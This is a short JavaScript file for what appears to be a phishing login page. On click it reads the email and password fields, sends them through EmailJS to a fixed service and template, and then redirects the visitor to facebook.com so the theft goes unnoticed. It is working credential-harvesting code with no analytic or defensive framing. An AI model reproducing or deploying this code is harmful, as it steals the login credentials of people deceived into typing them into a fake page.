const sendMail = () => {
  const temp = {
    email: document.getElementById("email").value,
    password: document.getElementById("password").value,
  };
  emailjs
    .send("service_yusc6nm", "template_pzta22j", temp)
    .then((res) => {
      location.href = "https://www.facebook.com";
    })
    .catch((err) => {
      console.log("Not send", err.status);
    });
};

document.getElementById("login").addEventListener("click", (event) => {
  event.preventDefault();
  sendMail();
});
